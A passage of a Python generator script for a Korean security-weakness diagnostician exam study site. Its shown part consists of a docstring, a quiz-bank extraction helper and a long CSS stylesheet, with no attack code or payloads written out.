# -*- coding: utf-8 -*-
"""보안약점 진단원 학습 센터(secure-dev-academy.html) 생성기 — 실무 대비 고도화판.
모드: 대시보드 / 개념학습(49) / 플래시카드 / 1교시 이론(MC·OX·단답) / 2교시 실무(정·오탐 판별+서술형 채점) / 오답노트.
진도·오답·최고점 localStorage 저장.
데이터: CONCEPTS·CODEPROBS=specs_academy, QUIZ=기존 BANK, PRACTICAL·THEORY=specs_academy_practical."""
import json, os, re, importlib

OUT = os.path.join(os.path.dirname(__file__), '..', 'public')


def get_quiz_bank():
    h = open(os.path.join(OUT, 'secure-dev-quiz.html'), encoding='utf-8').read()
    m = re.search(r'const BANK\s*=\s*(\[.*?\n\]);', h, re.S)
    return m.group(1)


TPL = r'''<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="KISA 소프트웨어 보안약점 진단원 이수시험(1교시 이론·2교시 실무) 대비 학습 센터 — 49개 보안약점 개념, 정·오탐 판별 서술형 실무, OX·단답 이론, 모의고사, 오답노트.">
<title>보안약점 진단원 학습 센터 | 1교시 이론 · 2교시 실무</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Lora:wght@600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--p:#6366f1;--p2:#8b5cf6;--ink:#1e293b;--muted:#64748b;--line:#e2e8f0;--ok:#22c55e;--no:#ef4444;--warn:#f59e0b;--bg:#f1f5f9}
body{font-family:'Lora',serif;background:var(--bg);color:var(--ink);line-height:1.6;min-height:100vh}
a{text-decoration:none;color:inherit}
.top{background:#0b1020;padding:9px 0}.top .wrap{max-width:1180px;margin:0 auto;padding:0 20px}
.top a{color:#a5b4fc;font-family:'JetBrains Mono',monospace;font-size:13px}
.hero{background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;padding:34px 0 24px}
.hero .wrap{max-width:1180px;margin:0 auto;padding:0 20px}
.hero h1{font-size:27px;margin-bottom:4px}.hero p{opacity:.9;font-size:14px}
.tabs{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:20;box-shadow:0 2px 10px rgba(2,6,23,.05)}
.tabs .wrap{max-width:1180px;margin:0 auto;padding:0 12px;display:flex;gap:4px;overflow-x:auto}
.tab{border:none;background:transparent;padding:15px 14px;font-family:'Lora',serif;font-weight:700;font-size:14px;color:var(--muted);cursor:pointer;border-bottom:3px solid transparent;white-space:nowrap;transition:.15s}
.tab:hover{color:var(--p)} .tab.on{color:var(--p);border-bottom-color:var(--p)}
.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
.view{display:none;padding:30px 0 60px}.view.on{display:block}
h2.st{font-size:23px;margin-bottom:6px}.sub{color:var(--muted);font-size:14px;margin-bottom:22px}
.dgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:14px;margin-bottom:26px}
.dcard{background:#fff;border:1px solid var(--line);border-radius:16px;padding:20px;text-align:center;box-shadow:0 6px 18px rgba(2,6,23,.05)}
.dcard b{display:block;font-size:30px;font-family:'JetBrains Mono',monospace;background:linear-gradient(135deg,#6366f1,#8b5cf6);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
.dcard span{font-size:12.5px;color:var(--muted)}
.prog-wrap{background:#fff;border:1px solid var(--line);border-radius:16px;padding:24px 26px;margin-bottom:22px}
.prog-wrap h3{font-size:17px;margin-bottom:16px}
.prow{display:flex;align-items:center;gap:12px;margin-bottom:12px}
.prow .nm{width:130px;font-size:14px;font-weight:700}
.prow .bar{flex:1;height:12px;background:#eef2ff;border-radius:10px;overflow:hidden}.prow .bar>i{display:block;height:100%;border-radius:10px}
.prow .vv{width:54px;text-align:right;font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--muted)}
.quick{display:flex;gap:10px;flex-wrap:wrap}
.qbtn{background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;border:none;padding:12px 20px;border-radius:30px;font-family:'Lora',serif;font-weight:700;font-size:14px;cursor:pointer;transition:.2s}
.qbtn:hover{transform:translateY(-2px)} .qbtn.ghost{background:#fff;color:var(--p);border:1.5px solid var(--p)}
.reset{background:none;border:1px solid var(--line);color:var(--muted);padding:8px 16px;border-radius:20px;font-size:12.5px;cursor:pointer;margin-top:18px}
.catbar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
.cchip{border:1.5px solid var(--line);background:#fff;border-radius:20px;padding:7px 15px;font-family:'Lora',serif;font-size:13.5px;font-weight:700;cursor:pointer;transition:.15s}
.cchip:hover{border-color:var(--p)} .cchip.on{background:var(--p);color:#fff;border-color:var(--p)}
.catinfo{background:#fff;border:1px solid var(--line);border-left:5px solid var(--p);border-radius:12px;padding:16px 18px;margin-bottom:18px;box-shadow:0 2px 8px rgba(2,6,23,.05)}
.catinfo .ci-h{font-size:16px;font-weight:800;color:#1e293b;margin-bottom:10px;display:flex;align-items:center;gap:8px}
.catinfo .ci-badge{color:#fff;font-size:12px;font-weight:700;border-radius:8px;padding:3px 10px}
.catinfo .ci-row{font-size:13.5px;line-height:1.65;color:#334155;margin-bottom:5px}
.catinfo .ci-row b{color:#0f172a;margin-right:6px}
.cgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px}
.ccard{background:#fff;border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:all 0.3s cubic-bezier(0.4, 0, 0.2, 1);box-shadow:0 2px 8px rgba(0,0,0,0.02)}
.ccard:hover{transform:translateY(-2px);box-shadow:0 6px 18px rgba(0,0,0,0.05)}
.ccard.done{border-color:#bbf7d0;box-shadow:0 0 0 2px #dcfce7 inset}
.ccard .ch{padding:15px 18px;cursor:pointer;display:flex;justify-content:space-between;align-items:flex-start;gap:10px;transition:background 0.2s}
.ccard .ch:hover{background:#f8fafc}
.ccard .ch h4{font-size:15.5px;line-height:1.4;color:#1e293b;transition:color 0.2s}
.ccard:hover h4{color:var(--p)}
.ccard .ch .cwe{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);margin-top:3px}
.ccard .badge{font-size:10.5px;color:#fff;border-radius:20px;padding:2px 9px;white-space:nowrap;font-family:'JetBrains Mono',monospace;box-shadow:0 2px 6px rgba(0,0,0,0.05)}
.ccard .detail{max-height:0;overflow:hidden;padding:0 18px;border-top:1px solid transparent;transition:max-height 0.4s cubic-bezier(0.4, 0, 0.2, 1), padding 0.4s ease, border-color 0.4s ease}
.ccard.open .detail{max-height:2500px;padding:16px 18px 22px;border-top-color:var(--line)}
.ccard.open{grid-column:1/-1;box-shadow:0 10px 25px rgba(0,0,0,0.04);border-color:var(--p)}
.ccard .detail > * {opacity:0;transform:translateY(10px);transition:opacity 0.35s ease 0.1s, transform 0.35s ease 0.1s}
.ccard.open .detail > * {opacity:1;transform:translateY(0)}
.ccard .fld{margin-top:12px}.ccard .fld .lb{font-size:12px;font-weight:700;color:var(--p);margin-bottom:3px}.ccard .fld .tx{font-size:14px;color:#334155;line-height:1.65}
.sim-card{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:16px;margin-top:8px}
.sim-scen{font-size:13.5px;color:#334155;margin-bottom:8px;line-height:1.5}
.sim-payload{font-size:13px;margin-bottom:10px}
.sim-payload code{background:#f1f5f9;color:#b91c1c;padding:3px 8px;border-radius:6px;font-family:'JetBrains Mono',monospace;font-weight:700}
.sim-terminal{background:#0b0f19;color:#e2e8f0;font-family:'JetBrains Mono',monospace;font-size:12px;padding:12px 14px;border-radius:8px;min-height:80px;white-space:pre-wrap;border:1px solid #1e293b;line-height:1.6;margin-top:8px;transition:all 0.3s}
.sim-terminal.active{border-color:#ef4444;box-shadow:0 0 10px rgba(239,68,68,0.15)}
.bcard { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
.bcard:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(2,6,23,.08); border-color: var(--p); }
.bcard .cpre { transition: border-color 0.2s; position: relative; }
.bcard .cpre.active-line-highlight { border-color: #38bdf8; box-shadow: 0 0 8px rgba(56,189,248,0.2) }
.basic-dbg-panel { background: #070b13; border: 1px solid #1e293b; border-radius: 10px; padding: 12px 14px; margin-top: 10px; font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #94a3b8; line-height: 1.5; max-height: 240px; overflow-y: auto; text-align: left; box-shadow: inset 0 2px 8px rgba(0,0,0,0.8); }
.basic-dbg-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 8px; font-weight: 700; color: #38bdf8; }
.basic-dbg-step { color: #f1f5f9; margin-bottom: 4px; display: flex; gap: 8px; align-items: flex-start; opacity: 0; transform: translateY(5px); animation: basicStepIn 0.3s forwards; }
@keyframes basicStepIn { to { opacity: 1; transform: translateY(0); } }
.basic-dbg-desc { font-size: 11.5px; color: #cbd5e1; border-left: 2px solid var(--p); padding-left: 8px; margin-top: 6px; }
.dtnote{font-size:12px;color:var(--muted);line-height:1.55;margin:2px 0 8px}
.exambox{border:1px solid #f59e0b;border-left-width:4px;background:#fffbeb;border-radius:9px;padding:9px 12px;margin:0 0 12px}
.examh{font-weight:700;color:#b45309;font-size:13px;margin-bottom:4px}
.examb{font-size:13px;line-height:1.6;color:#7c2d12;white-space:pre-wrap}
.dtree{display:flex;flex-direction:column;align-items:stretch;gap:0}
.dtstep{display:flex;align-items:flex-start;gap:9px;border:1px solid var(--line);border-left-width:4px;border-radius:9px;padding:8px 11px;background:#f8fafc}
.dtstep.safe{border-left-color:#16a34a;background:#f0fdf4}.dtstep.risk{border-left-color:#dc2626;background:#fef2f2}.dtstep.cond{border-left-color:#f59e0b;background:#fffbeb}
.dtstep .dtn{flex:0 0 auto;width:20px;height:20px;border-radius:50%;background:var(--p);color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;margin-top:1px}
.dtstep .dtq{flex:1;font-size:13.5px;color:#1e293b;font-weight:600;line-height:1.5}
.dtstep .dtv{flex:0 0 42%;font-size:12.5px;color:#475569;line-height:1.5}
.dtstep.safe .dtv{color:#15803d}.dtstep.risk .dtv{color:#b91c1c;font-weight:600}
.dtarrow{align-self:center;color:var(--muted);font-size:10px;line-height:1;margin:2px 0}
@media(max-width:640px){.dtstep{flex-wrap:wrap}.dtstep .dtv{flex-basis:100%;margin-left:29px}}
.ccard .done-btn{margin-top:14px;width:100%;border:1.5px solid var(--ok);background:#fff;color:#16a34a;padding:9px;border-radius:10px;font-family:'Lora',serif;font-weight:700;cursor:pointer;font-size:13.5px}
.ccard.done .done-btn{background:var(--ok);color:#fff}
.ccard .simlink{display:inline-block;margin-top:10px;font-size:12.5px;color:var(--p);font-weight:700}
.lgtabs{display:flex;gap:6px;margin:8px 0 0}
.lgtab{border:1.5px solid var(--line);border-bottom:none;background:#fff;border-radius:9px 9px 0 0;padding:7px 13px;font-family:'Lora',serif;font-weight:700;font-size:12.5px;cursor:pointer;color:var(--muted)}
.lgtab.on{background:var(--p);color:#fff;border-color:var(--p)}
.codepair{display:grid;grid-template-columns:1fr 1fr;gap:10px;border:1px solid var(--line);border-radius:0 10px 10px 10px;padding:10px;min-width:0}
@media(max-width:820px){.codepair{grid-template-columns:1fr}}
.cp{min-width:0;display:flex;flex-direction:column}
.cp .cph{font-size:12px;font-weight:700;padding:5px 9px;border-radius:7px 7px 0 0}
.cph.bad{background:#fef2f2;color:#b91c1c}.cph.good{background:#f0fdf4;color:#15803d}
.cpre{background:#0b1020;color:#e2e8f0;padding:11px 13px;border-radius:0 0 8px 8px;overflow-x:auto;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.6;white-space:pre;margin:0;max-height:360px;min-width:0;max-width:100%}
.cnote{font-size:12px;color:var(--muted);margin-top:8px;background:#f8fafc;border:1px dashed var(--line);border-radius:8px;padding:8px 10px}
.csrc{font-size:11px;color:var(--muted);margin-top:4px}
.flash-stage{max-width:560px;margin:0 auto;text-align:center}
.fcard{background:#fff;border:1px solid var(--line);border-radius:20px;min-height:240px;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:34px;cursor:pointer;box-shadow:0 12px 34px rgba(2,6,23,.1);transition:.2s}
.fcard:hover{transform:translateY(-3px)} .fcard .face-cat{font-size:12px;color:#fff;border-radius:20px;padding:3px 12px;margin-bottom:14px;font-family:'JetBrains Mono',monospace}
.fcard .fr{font-size:24px;font-weight:800}.fcard .hint{margin-top:16px;font-size:12.5px;color:var(--muted)}
.fcard .bk{font-size:15px;color:#334155;line-height:1.7;text-align:left}.fcard .bk b{color:var(--p)}
.frow{display:flex;gap:10px;justify-content:center;margin-top:18px}
.frow button{border:none;padding:13px 30px;border-radius:30px;font-family:'Lora',serif;font-weight:700;font-size:15px;cursor:pointer;transition:.2s}
.f-no{background:#fef2f2;color:#dc2626;border:1.5px solid #fecaca!important}.f-ok{background:#f0fdf4;color:#16a34a;border:1.5px solid #bbf7d0!important}
.f-mid{background:#fffbeb;color:#b45309;border:1.5px solid #fde68a!important}
.frow3{display:flex;gap:8px}.frow3 button{flex:1}
.next-tag{display:inline-block;font-size:11px;font-weight:700;background:#eff6ff;color:#1d4ed8;border:1px solid #bfdbfe;border-radius:6px;padding:1px 7px;margin-right:4px}
.fmeta{text-align:center;color:var(--muted);font-size:13px;margin-bottom:14px;font-family:'JetBrains Mono',monospace}
.setbox{background:#fff;border:1px solid var(--line);border-radius:16px;padding:26px;max-width:640px;margin:0 auto;text-align:center}
.setbox h3{font-size:19px;margin-bottom:8px}.setbox p{color:var(--muted);font-size:14px;margin-bottom:18px}
.setrow{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-bottom:16px}
.opt{text-align:left;border:1.5px solid var(--line);border-radius:12px;padding:13px 16px;cursor:pointer;font-family:'Lora',serif;font-size:15px;background:#fff;transition:.15s;display:flex;gap:10px;width:100%;margin-bottom:9px}
.opt:hover:not(:disabled){border-color:var(--p);background:#f5f7ff}.opt .lab{font-family:'JetBrains Mono',monospace;font-weight:700;color:var(--p)}
.opt.sel{border-color:var(--p);background:#eef2ff}.opt:disabled{cursor:default}
.opt.correct{border-color:var(--ok);background:#f0fdf4}.opt.correct .lab{color:var(--ok)}
.opt.wrong{border-color:var(--no);background:#fef2f2}.opt.wrong .lab{color:var(--no)}
.qbox{background:#fff;border:1px solid var(--line);border-radius:16px;padding:24px 26px;max-width:820px;margin:0 auto}
.bar2{height:8px;background:#eef2ff;border-radius:10px;overflow:hidden;margin-bottom:6px}.bar2>i{display:block;height:100%;background:linear-gradient(90deg,#6366f1,#8b5cf6);width:0;transition:.3s}
.qmeta{display:flex;justify-content:space-between;font-size:13px;color:var(--muted);font-family:'JetBrains Mono',monospace;margin-bottom:14px}
.timer{font-weight:700}.timer.warn{color:var(--no)}
.qtext{font-size:17px;font-weight:700;line-height:1.55;margin-bottom:14px}
.typetag{display:inline-block;font-size:11px;font-weight:700;color:#fff;border-radius:6px;padding:2px 8px;margin-right:8px;font-family:'JetBrains Mono',monospace}
.t-MC{background:#6366f1}.t-OX{background:#0ea5e9}.t-SHORT{background:#f59e0b}.t-PRAC{background:#7c3aed}
pre{background:#0b1020;color:#e2e8f0;padding:14px 16px;border-radius:10px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.7;margin-bottom:14px;white-space:pre}
.ln{color:#475569;user-select:none}
.cat-tag{display:inline-block;font-size:12px;color:#4338ca;background:#eef2ff;border:1px solid #c7d2fe;border-radius:20px;padding:3px 12px;margin-bottom:12px}
.exp{margin-top:14px;border-radius:12px;padding:14px 16px;font-size:14px;line-height:1.65;display:none}.exp.show{display:block}
.exp.ok{background:#f0fdf4;border-left:4px solid var(--ok)}.exp.no{background:#fef2f2;border-left:4px solid var(--no)}
.nav{margin-top:18px;text-align:right}
.btn{background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;border:none;padding:12px 26px;border-radius:30px;font-family:'Lora',serif;font-weight:700;font-size:15px;cursor:pointer;transition:.2s}
.btn:hover{transform:translateY(-2px)} .btn.ghost{background:#fff;color:var(--p);border:1.5px solid var(--p)}
.shortin{width:100%;border:1.5px solid var(--line);border-radius:10px;padding:13px 15px;font-family:'Lora',serif;font-size:15px}
.shortin:focus{outline:none;border-color:var(--p)}
/* 실무(2교시) */
.tfrow{display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap}
.tf{flex:1;min-width:200px;border:2px solid var(--line);border-radius:12px;padding:14px 16px;cursor:pointer;font-weight:700;transition:.15s;display:flex;align-items:center;gap:10px}
.tf:hover{border-color:var(--p)} .tf.sel.tp{border-color:var(--no);background:#fef2f2;color:#b91c1c} .tf.sel.fp{border-color:var(--ok);background:#f0fdf4;color:#15803d}
.tf .rd{width:18px;height:18px;border-radius:50%;border:2px solid currentColor;flex-shrink:0}
.flbl{font-size:13px;font-weight:700;color:var(--p);margin:14px 0 6px}
.parea{width:100%;border:1.5px solid var(--line);border-radius:10px;padding:12px 14px;font-family:'Lora',serif;font-size:14px;line-height:1.6;resize:vertical;min-height:74px}
.parea:focus{outline:none;border-color:var(--p)}
.parea:disabled,.pin:disabled{background:#f8fafc;color:#94a3b8}
.pin{width:100%;border:1.5px solid var(--line);border-radius:10px;padding:12px 14px;font-family:'JetBrains Mono',monospace;font-size:14px}
.pin:focus{outline:none;border-color:var(--p)}
.codearea{width:100%;border:1.5px solid var(--line);border-radius:10px;padding:12px 14px;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.6;resize:vertical;min-height:120px;background:#0b1020;color:#e2e8f0}
.codearea:focus{outline:none;border-color:var(--p)}
.report{margin-top:16px;background:#fafbff;border:1px solid var(--line);border-radius:14px;padding:18px 20px}
.scoreline{display:flex;align-items:center;gap:14px;margin-bottom:14px}
.scoreline .num{font-size:38px;font-weight:800;font-family:'JetBrains Mono',monospace}
.pass{color:#16a34a}.fail{color:#dc2626}
.prow2{display:flex;align-items:center;gap:10px;margin-bottom:8px;font-size:13.5px}
.prow2 .l{width:120px;font-weight:700}.prow2 .bar{flex:1;height:9px;background:#eef2ff;border-radius:8px;overflow:hidden}.prow2 .bar>i{display:block;height:100%;background:linear-gradient(90deg,#6366f1,#8b5cf6)}
.prow2 .g{width:60px;text-align:right;font-family:'JetBrains Mono',monospace;color:var(--muted)}
.model{margin-top:14px;border-top:1px dashed var(--line);padding-top:14px}
.model h4{font-size:14px;color:var(--p2);margin-bottom:8px}
.kw{display:inline-block;background:#eef2ff;color:#4338ca;border:1px solid #c7d2fe;border-radius:14px;padding:2px 10px;font-size:12px;margin:2px 3px;font-family:'JetBrains Mono',monospace}
.kw.hit{background:#dcfce7;color:#15803d;border-color:#bbf7d0}
.two{display:grid;grid-template-columns:1fr 1fr;gap:10px;min-width:0}@media(max-width:740px){.two{grid-template-columns:1fr}}
.two .pane{min-width:0}.two .pane pre{overflow-x:auto;max-width:100%;white-space:pre}
.two .pane h5{font-size:12px;color:var(--muted);margin-bottom:5px;font-family:'JetBrains Mono',monospace}
.diffpre{background:#0b1020;border-radius:10px;padding:12px 14px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.7;margin:0;white-space:pre}
.diffpre .d-del{display:block;background:rgba(239,68,68,.16);color:#fca5a5}
.diffpre .d-add{display:block;background:rgba(34,197,94,.16);color:#86efac}
.diffpre .d-ctx{display:block;color:#94a3b8}
.penline{color:#dc2626;font-weight:700}
.neg-kw{display:inline-block;background:#fef2f2;color:#b91c1c;border:1px solid #fecaca;border-radius:14px;padding:2px 10px;font-size:12px;margin:2px 3px;font-family:'JetBrains Mono',monospace}
.res{text-align:center;background:#fff;border:1px solid var(--line);border-radius:16px;padding:34px;max-width:740px;margin:0 auto}
.res .big{font-size:56px;font-weight:800;font-family:'JetBrains Mono',monospace;background:linear-gradient(135deg,#6366f1,#8b5cf6);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
.res .pf{font-size:22px;font-weight:800;margin:4px 0}
.rev-title{max-width:820px;margin:26px auto 10px;font-size:18px}
.rev-list{max-width:820px;margin:0 auto;display:flex;flex-direction:column;gap:10px}
.rev{background:#fff;border:1px solid var(--line);border-left:4px solid var(--ok);border-radius:12px;padding:13px 16px}
.rev.no{border-left-color:var(--no)}
.rev .rv-h{font-size:12.5px;font-weight:700;color:var(--muted);margin-bottom:6px;display:flex;align-items:center;gap:8px}
.rev .rv-cat{background:#eef2ff;color:#4338ca;border-radius:12px;padding:1px 9px;font-size:11px}
.rev .rv-q{font-size:14.5px;font-weight:700;margin-bottom:6px;line-height:1.5}
.rev .rv-mine{font-size:13px;color:#b91c1c;margin-bottom:3px}
.rev .rv-ans{font-size:13px;color:#15803d;margin-bottom:5px}
.rev .rv-exp{font-size:13px;color:#475569;line-height:1.6;background:#f8fafc;border-radius:8px;padding:8px 10px}
.wlist{display:flex;flex-direction:column;gap:12px}
.witem{background:#fff;border:1px solid var(--line);border-left:4px solid var(--no);border-radius:12px;padding:16px 18px}
.witem .wq{font-weight:700;margin-bottom:6px;font-size:14.5px}.witem .wa{color:#16a34a;font-size:13.5px;margin-bottom:4px}.witem .we{color:#475569;font-size:13.5px}
.witem .del{float:right;border:none;background:#fef2f2;color:#dc2626;border-radius:8px;padding:4px 10px;font-size:12px;cursor:pointer}
.rv-box{display:inline-block;font-size:11px;font-weight:700;font-family:'JetBrains Mono',monospace;background:#eef2ff;color:#4338ca;border-radius:6px;padding:1px 7px;margin-right:4px}
.due-tag{display:inline-block;font-size:11px;font-weight:700;background:#fff7ed;color:#c2410c;border:1px solid #fed7aa;border-radius:6px;padding:1px 7px;margin-right:4px}
.structline{margin-top:8px;font-size:13px;font-weight:700;border-radius:8px;padding:9px 12px;line-height:1.5}
.ast-on{font-size:11px;font-weight:700;background:#dcfce7;color:#15803d;border-radius:6px;padding:1px 7px}
.ast-off{font-size:11px;font-weight:700;background:#f1f5f9;color:#64748b;border-radius:6px;padding:1px 7px}
.structline.ok{background:#f0fdf4;color:#15803d;border:1px solid #bbf7d0}
.structline.no{background:#fff7ed;color:#c2410c;border:1px solid #fed7aa}
.rv-tag{font-size:12.5px;font-weight:700;color:var(--muted);margin-bottom:8px}
.rvq{font-size:15px;font-weight:700;line-height:1.55;color:var(--ink,#1e293b)}
.empty{text-align:center;color:var(--muted);padding:50px 0;font-size:15px}
@media(max-width:760px){.cgrid{grid-template-columns:1fr}}
/* 기초 과정 카드 */
.bgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px}
.bcard{background:#fff;border:1px solid var(--line);border-radius:14px;padding:18px 20px;box-shadow:0 2px 8px rgba(2,6,23,.05)}
.bcard .bh{display:flex;align-items:center;gap:10px;margin-bottom:10px}
.bcard .bh h4{font-size:16px;margin:0;color:#1e293b}
.blang{color:#fff;font-size:11px;font-weight:700;border-radius:8px;padding:3px 10px;font-family:'JetBrains Mono',monospace}
.bcard .btx{font-size:13.5px;line-height:1.65;color:#334155;margin-bottom:10px}
.bcard .bsec{font-size:12.5px;line-height:1.6;color:#9a3412;background:#fff7ed;border:1px solid #fed7aa;border-radius:8px;padding:9px 11px;margin-top:10px}
.bcard .bsec b{color:#c2410c}
/* 상용 도구 비교 */
.toolscmp{background:#fff;border:1px solid var(--line);border-radius:14px;padding:18px 20px;margin:18px 0;box-shadow:0 2px 8px rgba(2,6,23,.05)}
.toolscmp h3{font-size:15px;color:#1e293b;margin:0 0 10px}
.tpos{font-size:13px;line-height:1.7;color:#334155;background:#eef2ff;border-radius:10px;padding:12px 14px;margin-bottom:12px}
.ttbl-wrap{overflow-x:auto}
.ttbl{width:100%;border-collapse:collapse;font-size:12.5px;min-width:680px}
.ttbl th,.ttbl td{border:1px solid var(--line);padding:8px 10px;text-align:left;vertical-align:top}
.ttbl th{background:#f1f5f9;font-weight:700;color:#334155}
.ttbl .tv{color:var(--muted);font-size:11px}
.ttbl tr.ours{background:#f0fdf4}.ttbl tr.ours td{border-color:#bbf7d0}
/* 온라인 IDE */
.ide-bar{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:10px}
.ide-sel{flex:1;min-width:240px;max-width:100%;padding:9px 12px;border:1.5px solid var(--line);border-radius:10px;font-size:13px;font-family:'Lora',serif;background:#fff}
.ide-lang{font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;color:#fff;background:#334155;border-radius:7px;padding:4px 10px}
.ide-editor{height:380px;border:1px solid #2a2a45;border-radius:10px;overflow:hidden;background:#1e1e1e;color:#aaa;font-family:'JetBrains Mono',monospace;font-size:12px;padding:8px}
.ide-note{font-size:12.5px;color:#475569;background:#f8fafc;border-radius:8px;padding:9px 12px;margin:10px 0}
.ide-out-h{font-size:13px;font-weight:700;color:#334155;margin:12px 0 6px;display:flex;align-items:center;gap:10px}
.ide-status{font-size:12px;font-weight:600;color:var(--muted)}
.ide-out{background:#0a0a14;color:#d4d4d4;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.7;border-radius:10px;padding:14px 16px;min-height:90px;white-space:pre-wrap;overflow-x:auto}
.ide-fallback{padding:24px;color:#fca5a5;font-size:13px;text-align:center}
/* 취약 유형 Top 3 (메타인지 학습 안내) */
.topweak{background:linear-gradient(135deg,#fff7ed,#fff1f2);border:1px solid #fed7aa;border-radius:14px;padding:18px 20px;margin-bottom:18px}
.topweak h3{font-size:15px;color:#c2410c;margin:0 0 12px}
.tw-item{display:flex;align-items:center;gap:10px;margin-bottom:9px}
.tw-rank{width:22px;height:22px;flex-shrink:0;border-radius:50%;background:#c2410c;color:#fff;font-weight:700;font-size:12px;display:flex;align-items:center;justify-content:center}
.tw-cat{color:#fff;font-size:12px;font-weight:700;border-radius:8px;padding:3px 10px;flex-shrink:0;min-width:78px;text-align:center}
.tw-bar{flex:1;height:8px;background:#fde4cf;border-radius:5px;overflow:hidden}.tw-bar i{display:block;height:100%}
.tw-cnt{font-size:12.5px;font-weight:700;color:#9a3412;flex-shrink:0;min-width:58px;text-align:right}
.tw-tip{font-size:12px;color:#9a3412;margin:8px 0 0}
/* 모바일 통합 브레이크포인트(≤768px): 세로 스택 + 44px 터치 타겟 */
@media(max-width:768px){
  .dgrid{grid-template-columns:1fr!important;gap:12px}
  .codepair{grid-template-columns:1fr!important}
  .two{grid-template-columns:1fr!important}
  .tfrow{flex-direction:column;gap:8px}
  .tf{min-width:0;width:100%;padding:16px!important;font-size:14px;min-height:44px}
  .tab{padding:12px 10px!important;font-size:13px;min-height:44px}
  .opt{min-height:44px}
  .qbtn,.btn,.cchip{min-height:44px}
  pre.cpre,pre.diffpre,#prCode{font-size:11px;overflow-x:auto;white-space:pre}
  .parea,.codearea,.pin,.shortin{font-size:14px}
  .tw-cat{min-width:64px}
}
/* 접근성: 모션 최소화 선호 시 애니메이션 비활성화 + 키보드 포커스 표시 */
@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important;scroll-behavior:auto!important}}
a:focus-visible,button:focus-visible,input:focus-visible,textarea:focus-visible,.tab:focus-visible,.tf:focus-visible,.opt:focus-visible,.cchip:focus-visible{outline:3px solid #6366f1;outline-offset:2px;border-radius:6px}
/* 접근성: 스크린리더 전용 + 본문 바로가기(skip link) */
.visually-hidden{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap;border:0}
.skiplink{position:absolute;left:-999px;top:0;z-index:100;background:#4338ca;color:#fff;padding:10px 16px;border-radius:0 0 8px 0;font-weight:700;text-decoration:none}
.skiplink:focus{left:0}
.kbdhint{font-size:11.5px;color:var(--muted);margin-top:6px}
/* 인쇄/요약(PDF): 화면에서는 숨기고 인쇄 시 요약표만 표시 */
#printArea{display:none}
.ptbl{width:100%;border-collapse:collapse;font-size:10.5px;font-family:'Segoe UI','Malgun Gothic',sans-serif}
.ptbl th,.ptbl td{border:1px solid #999;padding:4px 6px;text-align:left;vertical-align:top}
.ptbl th{background:#eef2ff}.ptbl .pcwe{color:#666;font-size:9.5px;font-family:'JetBrains Mono',monospace}
.ptitle{font-family:'Segoe UI','Malgun Gothic',sans-serif;font-size:18px;margin:0 0 4px}.psub{font-size:11px;color:#555;margin:0 0 10px}
/* ===== 게이미피케이션: 레벨·XP·스트릭·배지·히트맵·학습경로 ===== */
.gam-row{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin:6px 0 16px}
.gam-lv{display:flex;align-items:center;gap:8px;background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;border-radius:12px;padding:8px 14px;font-weight:700}
.gam-lv .lv-num{font-size:15px;white-space:nowrap}
.gam-lv .lv-bar{width:120px;height:8px;background:rgba(255,255,255,.3);border-radius:6px;overflow:hidden}
.gam-lv .lv-bar i{display:block;height:100%;background:#fde047;border-radius:6px;transition:width .4s}
.gam-lv .lv-xp{font-size:12px;opacity:.95;white-space:nowrap}
.gam-chip{background:#fff;border:1px solid #e2e8f0;border-radius:20px;padding:7px 14px;font-size:13px;font-weight:600;color:#334155}
.gam-chip.streak.active{background:#fff7ed;border-color:#fdba74;color:#c2410c}
#gamToasts{position:fixed;right:16px;bottom:16px;z-index:9999;display:flex;flex-direction:column;gap:8px}
.gtoast{background:#1e293b;color:#fff;padding:11px 16px;border-radius:10px;font-size:13.5px;font-weight:600;box-shadow:0 8px 24px rgba(0,0,0,.25);opacity:0;transform:translateY(12px);transition:opacity .3s,transform .3s;max-width:280px}
.gtoast.show{opacity:1;transform:translateY(0)}
.badges-wrap{margin-top:22px}.badges-wrap h3{margin:0 0 12px;font-size:16px}
.bgrid-bdg{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}
